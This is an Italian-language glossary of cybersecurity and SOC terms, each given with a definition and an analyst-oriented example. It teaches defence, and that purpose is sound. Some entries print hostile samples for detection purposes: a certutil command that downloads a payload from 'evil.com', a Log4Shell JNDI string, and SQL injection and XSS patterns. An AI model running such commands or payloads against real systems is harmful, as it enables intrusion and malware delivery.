# 📖 Glossario Cybersecurity & SOC — A-Z

> **Guida di riferimento rapido** con 70+ termini fondamentali per un SOC Analyst.
> Ogni termine include il nome completo (se acronimo), una definizione chiara e, dove rilevante, un esempio pratico contestualizzato nel lavoro SOC.

---

## A

### APT (Advanced Persistent Threat)
Minaccia avanzata e persistente. Gruppo di attaccanti altamente organizzato e finanziato (spesso da Stati nazione) che conduce campagne di attacco prolungate nel tempo contro target specifici, con l'obiettivo di rubare dati sensibili o sabotare infrastrutture critiche.
> **Esempio SOC**: I gruppi APT come APT29 (Cozy Bear, attribuito alla Russia) utilizzano tecniche sofisticate di evasione e restano nascosti nelle reti per mesi. Il SOC deve monitorare IoC associati a questi gruppi tramite feed di threat intelligence.

### ARP (Address Resolution Protocol)
Protocollo di rete che mappa un indirizzo IP (livello 3) a un indirizzo MAC (livello 2) all'interno di una rete locale. I dispositivi inviano richieste ARP broadcast per scoprire il MAC address associato a un IP.
> **Esempio SOC**: L'attacco **ARP Spoofing** permette a un attaccante di intercettare il traffico di rete associando il proprio MAC all'IP del gateway. Monitorare cambiamenti anomali nelle tabelle ARP è una tecnica di detection.

### Attack Surface
L'insieme di tutti i punti di ingresso potenziali che un attaccante potrebbe sfruttare per compromettere un sistema: porte aperte, servizi esposti, applicazioni web, API, endpoint, accessi VPN, account utente.
> **Esempio SOC**: Ridurre l'attack surface significa chiudere porte inutili, disabilitare servizi non necessari e applicare il principio del minimo privilegio.

---

## B

### Blue Team
Il team difensivo di un'organizzazione, responsabile della protezione, del monitoraggio e della risposta agli incidenti. Include analisti SOC, incident responder, threat hunter e ingegneri di sicurezza. Si contrappone al Red Team (offensivo).
> **Esempio SOC**: Un SOC Analyst Tier 1 fa parte del Blue Team e ha il compito di monitorare gli alert, investigare le minacce e contenere gli incidenti.

### Botnet
Rete di dispositivi compromessi (bot o zombie) controllati da un attaccante tramite un server di **Command & Control (C2)**. Le botnet vengono utilizzate per attacchi DDoS, invio di spam, mining di criptovalute o distribuzione di malware.
> **Esempio SOC**: Un endpoint che genera traffico anomalo verso un IP noto come C2 potrebbe essere parte di una botnet. L'analista deve isolarlo e investigare.

### Brute Force
Tecnica di attacco che tenta tutte le possibili combinazioni di password (o un dizionario di password comuni) per ottenere l'accesso a un account. Varianti includono il **password spraying** (una password su molti account) e il **credential stuffing** (credenziali rubate da breach).
> **Esempio SOC**: Rilevabile tramite l'Event ID 4625 (login fallito) di Windows. 50+ tentativi falliti in pochi minuti dallo stesso IP sono un chiaro indicatore.

---

## C

### C2 / C&C (Command and Control)
Infrastruttura utilizzata dall'attaccante per comunicare con i sistemi compromessi, inviare comandi e ricevere dati esfiltrati. Può utilizzare protocolli legittimi come HTTPS, DNS o social media per nascondersi nel traffico normale.
> **Esempio SOC**: Un alert che segnala comunicazione di un endpoint con un IP classificato come C2 nei feed di threat intelligence richiede investigazione e isolamento immediato.

### CERT (Computer Emergency Response Team)
Team specializzato nella gestione degli incidenti informatici a livello nazionale o organizzativo. Coordina la risposta agli incidenti, pubblica advisory di sicurezza e fornisce supporto tecnico. Esempio: CERT-AgID (Italia).
> **Esempio SOC**: Il SOC consulta i bollettini del CERT nazionale per conoscere le minacce attive nel proprio Paese o settore.

### CIA Triad (Confidentiality, Integrity, Availability)
I tre pilastri fondamentali della sicurezza informatica: **Riservatezza** (accesso solo a chi autorizzato), **Integrità** (dati non alterati senza autorizzazione), **Disponibilità** (sistemi accessibili quando necessario).
> **Esempio SOC**: Un ransomware viola la **Disponibilità**, un data breach viola la **Riservatezza**, un defacement viola l'**Integrità**. Classificare gli incidenti in base alla CIA aiuta la prioritizzazione.

### CIDR (Classless Inter-Domain Routing)
Notazione per specificare intervalli di indirizzi IP. Usa un suffisso che indica quanti bit sono dedicati alla parte di rete. Es: `192.168.1.0/24` indica i 256 indirizzi da `192.168.1.0` a `192.168.1.255`.
> **Esempio SOC**: Nelle query SIEM, si usano range CIDR per filtrare traffico da/verso subnet specifiche, ad esempio per identificare scansioni interne.

### CSIRT (Computer Security Incident Response Team)
Simile al CERT, è un team dedicato alla gestione e al coordinamento della risposta agli incidenti di sicurezza informatica all'interno di un'organizzazione o di un settore.
> **Esempio SOC**: Il SOC escala gli incidenti confermati al CSIRT aziendale, che coordina la risposta a livello organizzativo e le eventuali comunicazioni esterne.

### CVE (Common Vulnerabilities and Exposures)
Sistema di identificazione standardizzato per le vulnerabilità note nella sicurezza informatica. Ogni vulnerabilità riceve un identificativo unico nel formato `CVE-ANNO-NUMERO` (es. `CVE-2021-44228` per Log4Shell).
> **Esempio SOC**: Quando viene pubblicata una nuova CVE critica, il SOC verifica se i sistemi aziendali sono vulnerabili e monitora i tentativi di exploit nei log.

### CVSS (Common Vulnerability Scoring System)
Sistema di punteggio da 0.0 a 10.0 che valuta la gravità di una vulnerabilità in base a fattori come la complessità dell'attacco, i privilegi richiesti e l'impatto su CIA.

| Punteggio | Severità |
|-----------|----------|
| 0.0 | Nessuna |
| 0.1 – 3.9 | Bassa |
| 4.0 – 6.9 | Media |
| 7.0 – 8.9 | Alta |
| 9.0 – 10.0 | Critica |

> **Esempio SOC**: Una CVE con CVSS 9.8 (critica) su un servizio esposto a Internet richiede attenzione immediata e patching prioritario.

---

## D

### DDoS (Distributed Denial of Service)
Attacco che mira a rendere un servizio non disponibile inondandolo di traffico proveniente da molte fonti distribuite (tipicamente una botnet). Si distingue dal DoS semplice per la natura distribuita.
> **Esempio SOC**: Un picco improvviso di traffico UDP verso i server web aziendali da migliaia di IP diversi indica un attacco DDoS volumetrico. Il SOC attiva le contromisure del provider di mitigazione.

### DFIR (Digital Forensics and Incident Response)
Disciplina che combina l'analisi forense digitale (raccolta e analisi di evidenze) con la risposta agli incidenti. I professionisti DFIR investigano le intrusioni, recuperano le evidenze e ricostruiscono la catena degli eventi.
> **Esempio SOC**: Dopo un incidente grave, il team DFIR analizza le immagini disco, i dump di memoria e i log per determinare il vettore d'ingresso, la portata della compromissione e le azioni dell'attaccante.

### DKIM (DomainKeys Identified Mail)
Meccanismo di autenticazione email che permette al destinatario di verificare che un'email sia stata effettivamente inviata dal dominio dichiarato e non sia stata alterata durante il transito, tramite una firma crittografica.
> **Esempio SOC**: Nell'analisi di un'email di phishing, verificare il risultato DKIM nell'header aiuta a determinare se il messaggio è legittimo o spoofato.

### DLP (Data Loss Prevention)
Tecnologia e insieme di policy che prevengono la fuoriuscita non autorizzata di dati sensibili dall'organizzazione. Monitora e/o blocca il trasferimento di dati tramite email, web, USB, cloud storage e altri canali.
> **Esempio SOC**: Un alert DLP segnala che un utente ha tentato di inviare un file Excel con numeri di carte di credito via email personale. L'analista investiga se è intenzionale o accidentale.

### DMARC (Domain-based Message Authentication, Reporting and Conformance)
Protocollo di autenticazione email che combina SPF e DKIM. Permette al proprietario di un dominio di specificare come gestire le email che non superano i controlli di autenticazione (nessuna azione, quarantena o rifiuto).
> **Esempio SOC**: Un dominio con DMARC impostato su `p=reject` blocca automaticamente le email spoofate. Se impostato su `p=none`, il SOC deve monitorare i report per identificare abusi.

### DNS (Domain Name System)
Sistema che traduce i nomi di dominio leggibili (es. `google.com`) in indirizzi IP numerici (es. `142.250.180.46`). Funziona come la "rubrica telefonica" di Internet ed è un protocollo fondamentale per il funzionamento della rete.
> **Esempio SOC**: Il DNS è uno dei protocolli più abusati dagli attaccanti. Il **DNS tunneling** nasconde dati nelle query DNS per esfiltrare informazioni o comunicare con server C2, bypassando i controlli di sicurezza tradizionali.

### DoS (Denial of Service)
Attacco che mira a rendere un servizio non disponibile sovraccaricandolo di richieste o sfruttando vulnerabilità. A differenza del DDoS, proviene da una singola fonte.
> **Esempio SOC**: Un attacco Slowloris mantiene aperte migliaia di connessioni HTTP parziali, esaurendo le risorse del web server. L'analista rileva un numero anomalo di connessioni TCP in stato half-open.

---

## E

### EDR (Endpoint Detection and Response)
Soluzione di sicurezza installata sugli endpoint (PC, server, laptop) che monitora continuamente l'attività del sistema, rileva comportamenti sospetti e fornisce capacità di risposta (isolamento, kill process, raccolta forense).
> **Esempio SOC**: L'EDR segnala che `powershell.exe` ha eseguito un comando con una stringa encoded in base64 e ha stabilito una connessione verso un IP esterno. L'analista indaga la process tree per ricostruire la catena di attacco.

### Exfiltration
Il trasferimento non autorizzato di dati dall'interno di un'organizzazione verso l'esterno, controllato dall'attaccante. Può avvenire tramite canali diversi: HTTP/S, DNS tunneling, FTP, email, dispositivi USB, servizi cloud.
> **Esempio SOC**: Un alert del DLP o del proxy segnala un upload di 500MB verso un servizio di cloud storage non aziendale alle 3 di notte. L'analista verifica il contenuto e il contesto.

### Exploit
Codice o tecnica che sfrutta una vulnerabilità specifica in un software o sistema per ottenere accesso non autorizzato, eseguire codice arbitrario o causare comportamenti non previsti.
> **Esempio SOC**: Un exploit per la CVE-2021-44228 (Log4Shell) permette l'esecuzione remota di codice tramite una stringa JNDI malevola nei log. Il SOC cerca nei log tentativi di exploit come `${jndi:ldap://...}`.

---

## F

### False Positive (Falso Positivo)
Un alert generato dal sistema di sicurezza che segnala un'attività come malevola quando in realtà è legittima. Un eccesso di falsi positivi causa **alert fatigue** e riduce l'efficacia del SOC.
> **Esempio SOC**: Un backup notturno automatizzato genera un alert per "trasferimento dati massivo" che è in realtà un'attività pianificata. L'analista chiude l'alert e aggiorna la regola con un'eccezione.

### False Negative (Falso Negativo)
Una minaccia reale che non viene rilevata dal sistema di sicurezza. È più pericoloso del falso positivo perché l'attaccante opera indisturbato.
> **Esempio SOC**: Un attaccante usa tecniche di evasione (offuscamento, cifratura, LOLBins) per evitare la detection del SIEM. Il threat hunting proattivo aiuta a scoprire ciò che gli alert automatici non catturano.

### Firewall
Dispositivo o software di sicurezza che filtra il traffico di rete in base a regole predefinite, controllando quali comunicazioni sono permesse e quali bloccate tra reti diverse (es. rete interna e Internet).
> **Esempio SOC**: I log del firewall sono una delle fonti principali per il SIEM. L'analista li usa per identificare connessioni bloccate verso IP malevoli, tentativi di scansione e traffico anomalo.

### Forensics (Digital Forensics)
Disciplina che si occupa della raccolta, preservazione, analisi e presentazione di evidenze digitali, seguendo procedure che garantiscono l'ammissibilità in tribunale (chain of custody).
> **Esempio SOC**: Dopo la compromissione di un server, il team forensic crea un'immagine bit-a-bit del disco, analizza la memoria RAM con Volatility e ricostruisce la timeline degli eventi.

---

## G

### Governance
Insieme di politiche, procedure e framework che guidano la gestione della sicurezza informatica di un'organizzazione. Include la definizione di ruoli, responsabilità, standard di sicurezza e metriche di performance.
> **Esempio SOC**: Le policy di governance definiscono le procedure di escalation, i tempi di risposta SLA e gli obblighi di reportistica del SOC.

---

## H

### HIDS (Host-based Intrusion Detection System)
Sistema di rilevazione delle intrusioni installato su un singolo host che monitora l'attività locale: file system, log di sistema, processi, connessioni. Complementare al NIDS che monitora il traffico di rete.
> **Esempio SOC**: OSSEC e Wazuh sono esempi di HIDS open source. Generano alert quando vengono modificati file critici di sistema, creati nuovi servizi o eseguiti comandi sospetti.

### Honeypot
Sistema o servizio progettato per apparire come un target legittimo vulnerabile, con lo scopo di attirare gli attaccanti, studiare le loro tecniche e raccogliere intelligence. Non ha traffico legittimo, quindi qualsiasi interazione è sospetta.
> **Esempio SOC**: Un honeypot che simula un server SSH esposto rileva tentativi di brute force e raccoglie le credenziali usate dagli attaccanti e i comandi eseguiti post-accesso, fornendo intelligence sulle TTP degli avversari.

---

## I

### IDS (Intrusion Detection System)
Sistema che monitora il traffico di rete o l'attività di un host per rilevare attività sospette o malevole. Genera alert ma **non blocca** il traffico (a differenza dell'IPS).
> **Esempio SOC**: Snort e Suricata sono IDS open source. L'IDS genera alert basati su firme (signature-based) o anomalie (anomaly-based) che il SOC deve investigare.

### Incident (Incidente di Sicurezza)
Un evento di sicurezza confermato che ha un impatto negativo sulla riservatezza, integrità o disponibilità dei sistemi o dei dati di un'organizzazione. Richiede una risposta formale secondo il piano di incident response.
> **Esempio SOC**: Un alert per login sospetto (evento) viene investigato e si conferma che l'account è stato compromesso e l'attaccante ha avuto accesso a dati sensibili → diventa un **incidente**.

### IoC (Indicator of Compromise)
Evidenza tecnica che indica che un sistema è stato compromesso. Può essere un hash di file malevolo, un indirizzo IP di C2, un dominio di phishing, una chiave di registro modificata.
> **Esempio SOC**: L'analista riceve un feed di threat intelligence con nuovi IoC e li inserisce nel SIEM per verificare se ci sono match con il traffico aziendale (retrohunting).

| Tipo di IoC | Esempio |
|-------------|---------|
| Hash file (MD5/SHA256) | `a1b2c3d4e5f6...` |
| Indirizzo IP | `185.220.101.45` |
| Dominio | `malware-download.evil.com` |
| URL | `https://phishing.site/login` |
| Email mittente | `ceo@company-secure.tk` |
| Chiave di registro | `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\malware` |

### IoA (Indicator of Attack)
Indicatore che descrive il **comportamento** di un attacco piuttosto che un artefatto specifico. Mentre gli IoC sono reattivi (l'attacco è avvenuto), gli IoA sono proattivi e focalizzati sulla detection in tempo reale.
> **Esempio SOC**: Un IoA potrebbe essere "PowerShell che scarica ed esegue codice da un URL remoto" — il comportamento è sospetto indipendentemente dall'URL specifico. Questo rende gli IoA più resistenti ai cambiamenti dell'infrastruttura dell'attaccante.

### IPS (Intrusion Prevention System)
Evoluzione dell'IDS che, oltre a rilevare le intrusioni, è in grado di **bloccare attivamente** il traffico malevolo. È posizionato inline nel flusso di rete.
> **Esempio SOC**: L'IPS blocca automaticamente un tentativo di exploit di una vulnerabilità nota e genera un alert. L'analista verifica se l'exploit ha avuto successo prima del blocco e se ci sono altri tentativi.

---

## K

### KQL (Kusto Query Language)
Linguaggio di query utilizzato in Microsoft Sentinel e Azure Data Explorer per cercare, filtrare e analizzare grandi volumi di dati. Sintassi basata su pipe (`|`) per concatenare operazioni.
> **Esempio SOC**: Query KQL per trovare login falliti: `SecurityEvent | where EventID == 4625 | summarize count() by TargetAccount | sort by count_ desc`

---

## L

### Lateral Movement (Movimento Laterale)
Tecnica utilizzata dagli attaccanti per muoversi da un sistema compromesso ad altri sistemi all'interno della stessa rete, espandendo il proprio accesso e avvicinandosi agli obiettivi finali.
> **Esempio SOC**: Dopo aver compromesso una workstation utente, l'attaccante usa Pass-the-Hash con Mimikatz per accedere ad altri sistemi. Il SOC rileva login anomali di tipo 3 (network) tra workstation, che non è un comportamento normale.

### LOLBins (Living Off the Land Binaries)
Binari legittimi già presenti nel sistema operativo (firmati e affidabili) che gli attaccanti utilizzano per eseguire azioni malevole, evitando la detection basata su firma perché sono programmi "fidati".
> **Esempio SOC**: L'attaccante usa `certutil.exe -urlcache -f http://evil.com/payload.exe payload.exe` per scaricare un malware. Certutil è un tool legittimo di Windows per i certificati, quindi l'antivirus non lo blocca. Il SOC monitora l'uso anomalo di questi binari.

---

## M

### Malware
Software malevolo progettato per danneggiare, infiltrare o eseguire azioni non autorizzate su un sistema. Categoria generale che include virus, worm, trojan, ransomware, spyware, adware, rootkit e fileless malware.

| Tipo | Comportamento |
|------|--------------|
| **Virus** | Si replica attaccandosi ad altri file |
| **Worm** | Si auto-propaga senza interazione utente |
| **Trojan** | Si maschera da software legittimo |
| **Ransomware** | Cifra i file e chiede riscatto |
| **Spyware** | Raccoglie informazioni sull'utente |
| **Rootkit** | Si nasconde nel sistema a basso livello |
| **Fileless** | Opera solo in memoria, senza file su disco |

### MISP (Malware Information Sharing Platform)
Piattaforma open source per la condivisione di indicatori di compromissione (IoC) e informazioni sulle minacce tra organizzazioni. Permette di creare, condividere e correlare eventi di sicurezza.
> **Esempio SOC**: Il SOC utilizza MISP per importare feed di threat intelligence, condividere IoC con organizzazioni partner e automatizzare la ricerca di match nei log del SIEM.

### MITRE ATT&CK
Knowledge base pubblica di tattiche, tecniche e procedure (TTP) degli avversari, basata su osservazioni del mondo reale. Organizzata in matrici per Enterprise, Mobile e ICS, con 14 tattiche e centinaia di tecniche.
> **Esempio SOC**: L'analista mappa un alert che rileva l'uso di `schtasks.exe` per creare un task pianificato alla tecnica **T1053.005 (Scheduled Task)** sotto la tattica **Persistence**. Questo aiuta a comprendere l'obiettivo dell'attaccante.

### MTTD (Mean Time to Detect)
Tempo medio impiegato dal SOC per rilevare una minaccia o un incidente, dal momento in cui l'attaccante ottiene l'accesso al momento in cui l'attività viene scoperta.
> **Esempio SOC**: Un MTTD di 24 ore significa che in media passano 24 ore prima che un'intrusione venga rilevata. L'obiettivo è ridurlo il più possibile.

### MTTR (Mean Time to Respond)
Tempo medio impiegato dal SOC per rispondere a un incidente dopo che è stato rilevato, fino al completo contenimento ed eradicazione della minaccia.
> **Esempio SOC**: Un MTTR di 4 ore significa che il SOC impiega in media 4 ore per contenere un incidente dopo il rilevamento. SOAR e automazione aiutano a ridurre questo valore.

---

## N

### NAT (Network Address Translation)
Tecnologia che traduce gli indirizzi IP privati delle reti interne in indirizzi IP pubblici per la comunicazione su Internet. Permette a molti dispositivi di condividere un singolo IP pubblico.
> **Esempio SOC**: Il NAT complica l'indagine forense perché più dispositivi interni appaiono con lo stesso IP pubblico nei log esterni. Per identificare il dispositivo specifico, è necessario correlare con i log del firewall/NAT interni.

### NIDS (Network-based Intrusion Detection System)
Sistema IDS che monitora il traffico di rete analizzando i pacchetti in transito per identificare attività sospette o malevole. Posizionato in punti strategici della rete (es. span port).
> **Esempio SOC**: Suricata configurato come NIDS analizza tutto il traffico che attraversa il segmento di rete e genera alert quando rileva firme di attacco note (es. tentativi di exploit, C2 beaconing).

### NIST (National Institute of Standards and Technology)
Agenzia governativa USA che pubblica standard, linee guida e framework per la cybersecurity. I più noti sono il **NIST Cybersecurity Framework (CSF)** e il **NIST SP 800-61** (guida alla gestione degli incidenti).
> **Esempio SOC**: Il processo di incident response del SOC segue tipicamente le fasi definite dal NIST SP 800-61: Preparation, Detection & Analysis, Containment/Eradication/Recovery, Post-Incident Activity.

---

## O

### OSINT (Open Source Intelligence)
Raccolta e analisi di informazioni da fonti pubblicamente accessibili (siti web, social media, database pubblici, registri WHOIS, Shodan, motori di ricerca) per scopi di intelligence o investigazione.
> **Esempio SOC**: L'analista usa strumenti OSINT come Shodan, WHOIS, DNS lookup e Google dorks per raccogliere informazioni su un IP o dominio sospetto trovato nei log.

---

## P

### Payload
Il componente di un exploit o malware che esegue l'azione malevola vera e propria (es. aprire una reverse shell, cifrare i file, esfiltrare dati). Si distingue dal "delivery mechanism" che è il metodo di consegna.
> **Esempio SOC**: Un'email di phishing contiene un documento Word con macro (delivery mechanism) che scarica ed esegue un ransomware (payload).

### Pentesting (Penetration Testing)
Test di sicurezza autorizzato in cui un professionista (pentester) simula un attacco reale contro un sistema, una rete o un'applicazione per identificare vulnerabilità sfruttabili, prima che un attaccante reale le trovi.
> **Esempio SOC**: Il SOC deve essere informato dei penetration test pianificati per evitare di confondere le attività del pentester con un attacco reale, causando falsi positivi.

### Persistence (Persistenza)
Tecnica utilizzata dagli attaccanti per mantenere l'accesso a un sistema compromesso anche dopo riavvii, cambio password o altri eventi. Include la creazione di backdoor, servizi malevoli, task pianificati o chiavi di registro.
> **Esempio SOC**: L'analista monitora Event ID 4698 (creazione scheduled task), 7045 (installazione servizio) e modifiche alle chiavi di auto-avvio del registro per rilevare meccanismi di persistenza.

### Phishing
Tecnica di ingegneria sociale in cui l'attaccante invia comunicazioni fraudolente (email, SMS, chiamate) che imitano entità affidabili per indurre la vittima a rivelare credenziali, cliccare link malevoli o aprire allegati infetti.
> **Esempio SOC**: Il SOC riceve la segnalazione di un'email sospetta da un utente. L'analista analizza gli header, verifica SPF/DKIM/DMARC, controlla l'URL su VirusTotal e cerca se altri utenti hanno ricevuto la stessa email.

### Playbook
Documento operativo che descrive le procedure step-by-step da seguire per rispondere a un tipo specifico di incidente o alert di sicurezza. Standardizza la risposta e riduce il tempo di reazione.
> **Esempio SOC**: Il playbook per "Phishing Email Reported" specifica i passaggi: analisi header, verifica link/allegati in sandbox, ricerca di altri destinatari, contenimento (blocco mittente, purge email), e documentazione.

### Privilege Escalation (Escalazione dei Privilegi)
Tecnica con cui un attaccante eleva i propri privilegi da un livello basso (utente standard) a un livello alto (amministratore, root, SYSTEM), ottenendo maggiore controllo sul sistema.
> **Esempio SOC**: L'analista rileva l'Event ID 4672 (assegnazione privilegi speciali) per un utente che normalmente non dovrebbe avere privilegi elevati, oppure l'esecuzione di tool come Mimikatz o exploit per vulnerabilità del kernel.

---

## R

### Ransomware
Tipo di malware che cifra i file della vittima e richiede un pagamento (riscatto, tipicamente in criptovaluta) per fornire la chiave di decifratura. Le varianti moderne praticano la "doppia estorsione": cifrano i file E minacciano di pubblicare i dati rubati.
> **Esempio SOC**: Il SOC rileva la creazione massiva di file con estensioni insolite (.encrypted, .locked) e note di riscatto. L'azione immediata è l'isolamento dei sistemi colpiti e la verifica dell'integrità dei backup.

### Red Team
Il team offensivo che simula attacchi reali contro l'organizzazione per testare le difese del Blue Team. A differenza del pentesting, il Red Team opera con obiettivi ampi e senza che i difensori ne siano consapevoli (in modo da testare la reale capacità di rilevamento).
> **Esempio SOC**: Il Red Team lancia un attacco di spear phishing simulato. Se il SOC non lo rileva, l'esercizio evidenzia un gap nella detection che deve essere colmato.

### Remediation
Processo di correzione e risoluzione delle vulnerabilità o delle conseguenze di un incidente di sicurezza. Include il patching dei sistemi, il ripristino dei servizi, il cambio delle credenziali e l'implementazione di controlli aggiuntivi.
> **Esempio SOC**: Dopo un incidente di compromissione di un server web, la remediation include: patching della vulnerabilità sfruttata, rimozione della web shell, cambio di tutte le credenziali, revisione dei log per confermare la pulizia completa.

### Runbook
Simile al playbook, è un documento che descrive procedure operative standardizzate. Spesso il termine "runbook" è usato per procedure più tecniche e dettagliate, mentre "playbook" è più ad alto livello.
> **Esempio SOC**: Un runbook potrebbe descrivere i comandi esatti da eseguire per isolare un endpoint tramite l'API dell'EDR, o le query KQL specifiche da lanciare nel SIEM per un determinato tipo di investigazione.

---

## S

### Sandbox
Ambiente isolato e controllato utilizzato per eseguire in sicurezza file sospetti, URL o malware, osservandone il comportamento senza rischio per i sistemi di produzione.
> **Esempio SOC**: L'analista sottomette un allegato email sospetto a una sandbox (Any.Run, Joe Sandbox, Hybrid Analysis) che lo esegue in una macchina virtuale e riporta: file creati, processi avviati, connessioni di rete, modifiche al registro.

### SIEM (Security Information and Event Management)
Piattaforma centralizzata che raccoglie, normalizza, correla e analizza log ed eventi da molteplici fonti di sicurezza per rilevare minacce, generare alert e supportare la compliance. È il cuore tecnologico del SOC.
> **Esempio SOC**: Microsoft Sentinel, Splunk, QRadar e Elastic SIEM sono i SIEM più utilizzati. L'analista usa il SIEM per eseguire query, analizzare alert e costruire dashboard di monitoraggio.

### SOAR (Security Orchestration, Automation and Response)
Piattaforma che automatizza e orchestra i processi di risposta agli incidenti connettendo diversi strumenti di sicurezza, eseguendo azioni automatiche basate su playbook e gestendo il workflow di incident response.
> **Esempio SOC**: Quando il SIEM genera un alert per phishing, il SOAR automaticamente: estrae gli IoC dall'email, li verifica su VirusTotal, cerca altri destinatari e, se confermato, blocca il mittente sul gateway email.

### SOC (Security Operations Center)
Centro operativo dedicato al monitoraggio continuo (24/7) della sicurezza informatica di un'organizzazione. Il team SOC rileva, analizza, risponde e documenta gli incidenti di sicurezza.
> **Esempio SOC**: Un SOC tipico è organizzato in Tier 1 (triage), Tier 2 (investigation), Tier 3 (threat hunting), con strumenti come SIEM, EDR, SOAR, piattaforme di threat intelligence e sistemi di ticketing.

### SPF (Sender Policy Framework)
Meccanismo di autenticazione email che permette al proprietario di un dominio di specificare quali server sono autorizzati a inviare email per conto di quel dominio, tramite un record DNS TXT.
> **Esempio SOC**: Se un'email arriva con `SPF: fail`, significa che il server di invio non è autorizzato dal dominio mittente → forte indicatore di email spoofata/phishing.

### SPL (Search Processing Language)
Linguaggio di query proprietario di Splunk utilizzato per cercare, filtrare, trasformare e visualizzare i dati nei log indicizzati. Sintassi basata su pipe (`|`) per concatenare comandi.
> **Esempio SOC**: Query SPL per trovare connessioni verso IP malevoli: `index=firewall action=allowed dest_ip IN (lista_IoC) | stats count by src_ip, dest_ip | sort -count`

### SQL Injection (SQLi)
Vulnerabilità delle applicazioni web che permette a un attaccante di iniettare codice SQL malevolo nei campi di input, manipolando le query al database per accedere, modificare o cancellare dati non autorizzati.
> **Esempio SOC**: Nei log del WAF, l'analista cerca pattern come `' OR 1=1`, `UNION SELECT`, `; DROP TABLE` nei parametri delle richieste HTTP, che indicano tentativi di SQL injection.

### SSL/TLS (Secure Sockets Layer / Transport Layer Security)
Protocolli crittografici che garantiscono la riservatezza e l'integrità delle comunicazioni su rete. TLS è il successore di SSL. HTTPS = HTTP + TLS. Utilizzano certificati digitali per l'autenticazione.
> **Esempio SOC**: L'analista monitora certificati SSL/TLS scaduti, auto-firmati o emessi da CA sconosciute come possibili indicatori di attacchi MitM o siti di phishing.

---

## T

### Threat Hunting
Attività proattiva di ricerca di minacce che potrebbero aver eluso i sistemi di detection automatici. Il threat hunter formula ipotesi basate su intelligence e le verifica analizzando i dati disponibili (log, telemetria EDR, traffico di rete).
> **Esempio SOC**: Un threat hunter ipotizza che un gruppo APT noto per usare DNS tunneling possa aver preso di mira l'organizzazione. Analizza le query DNS cercando sottodomini con entropia anomala e lunghezze inusuali.

### Threat Intelligence (Intelligence sulle Minacce)
Informazioni raccolte, analizzate e contestualizzate sulle minacce cyber, gli attaccanti, le loro motivazioni, le loro capacità e le loro TTP. Può essere strategica (alto livello), tattica (TTP) o operativa (IoC specifici).
> **Esempio SOC**: Il SOC integra feed di threat intelligence (commerciali e open source come AlienVault OTX, MISP, VirusTotal) nel SIEM per arricchire gli alert con contesto sugli IoC rilevati.

### TTP (Tactics, Techniques, and Procedures)
Framework che descrive **come** operano gli attaccanti: le **Tattiche** sono gli obiettivi strategici, le **Tecniche** sono i metodi usati, le **Procedure** sono le implementazioni specifiche. Standardizzate da MITRE ATT&CK.
> **Esempio SOC**: Comprendere le TTP di un gruppo APT permette di costruire regole di detection mirate. Es: il gruppo Lazarus (APT38) usa frequentemente PowerShell per la fase di Execution → il SOC rafforza il monitoraggio di PowerShell.

---

## V

### VPN (Virtual Private Network)
Tecnologia che crea un tunnel crittografato tra il dispositivo dell'utente e la rete aziendale, proteggendo il traffico e permettendo l'accesso remoto sicuro alle risorse interne.
> **Esempio SOC**: L'analista monitora i login VPN per attività anomale: accessi da geolocalizzazioni inusuali, login simultanei da due Paesi diversi (impossible travel), connessioni in orari non lavorativi, brute force sulle credenziali VPN.

### Vulnerability (Vulnerabilità)
Debolezza in un sistema, software, configurazione o processo che può essere sfruttata da un attaccante per compromettere la sicurezza. Identificata tramite vulnerability scanning e classificata con CVE e CVSS.
> **Esempio SOC**: Il vulnerability scanner rileva che un server web esposto a Internet ha una CVE critica non patchata. Il SOC avvisa il team IT per il patching prioritario e nel frattempo crea una regola di detection per tentativi di exploit di quella specifica CVE.

---

## W

### WAF (Web Application Firewall)
Firewall applicativo che protegge le applicazioni web filtrando e monitorando il traffico HTTP/HTTPS a livello 7 del modello OSI. Protegge da attacchi come SQL injection, XSS, CSRF e directory traversal.
> **Esempio SOC**: I log del WAF mostrano centinaia di richieste bloccate con payload SQLi dallo stesso IP. L'analista verifica se qualche richiesta è passata prima dell'attivazione del blocco e controlla se il server web è stato compromesso.

---

## X

### XDR (Extended Detection and Response)
Evoluzione dell'EDR che estende la rilevazione e la risposta oltre l'endpoint, correlando dati da endpoint, rete, email, cloud e identità in un'unica piattaforma per una visibilità completa sulla catena di attacco.
> **Esempio SOC**: L'XDR correla un'email di phishing ricevuta (detection email), il click sul link (detection proxy), il download del malware (detection endpoint) e la comunicazione C2 (detection rete) in un unico incidente, riducendo il tempo di investigazione.

### XSS (Cross-Site Scripting)
Vulnerabilità delle applicazioni web che permette a un attaccante di iniettare script malevoli (tipicamente JavaScript) nelle pagine visualizzate da altri utenti, rubando sessioni, cookie, credenziali o reindirizzando a siti malevoli.

| Tipo | Descrizione |
|------|------------|
| **Reflected XSS** | Lo script è incluso nella richiesta e riflesso nella risposta |
| **Stored XSS** | Lo script è salvato nel database e mostrato a tutti gli utenti |
| **DOM-based XSS** | Lo script manipola il DOM lato client |

> **Esempio SOC**: Nei log del WAF o del web server, l'analista cerca pattern come `<script>`, `javascript:`, `onerror=`, `onload=` nei parametri delle richieste HTTP.

---

## Z

### Zero-Day
Vulnerabilità sconosciuta al produttore del software e per la quale non esiste ancora una patch. L'attaccante che la scopre può sfruttarla senza che i sistemi di difesa (basati su firme note) possano rilevarla.
> **Esempio SOC**: Gli attacchi zero-day sono i più pericolosi perché non esiste una firma di detection. La detection comportamentale (EDR, analisi anomalie, threat hunting) e la segmentazione di rete sono le migliori difese fino alla disponibilità di una patch.

---

## 📊 Riepilogo Rapido — Acronimi più usati nel SOC

| Acronimo | Significato |
|----------|------------|
| APT | Advanced Persistent Threat |
| C2 | Command and Control |
| CIA | Confidentiality, Integrity, Availability |
| CVE | Common Vulnerabilities and Exposures |
| CVSS | Common Vulnerability Scoring System |
| DDoS | Distributed Denial of Service |
| DFIR | Digital Forensics and Incident Response |
| DLP | Data Loss Prevention |
| DNS | Domain Name System |
| EDR | Endpoint Detection and Response |
| FP / FN | False Positive / False Negative |
| HIDS | Host-based Intrusion Detection System |
| IDS / IPS | Intrusion Detection / Prevention System |
| IoC / IoA | Indicator of Compromise / Attack |
| KQL | Kusto Query Language |
| MITRE ATT&CK | Framework di TTP degli avversari |
| MTTD / MTTR | Mean Time to Detect / Respond |
| NIDS | Network-based Intrusion Detection System |
| NIST | National Institute of Standards and Technology |
| OSINT | Open Source Intelligence |
| SIEM | Security Information and Event Management |
| SOAR | Security Orchestration, Automation and Response |
| SOC | Security Operations Center |
| SPF | Sender Policy Framework |
| SPL | Search Processing Language |
| SSL/TLS | Secure Sockets Layer / Transport Layer Security |
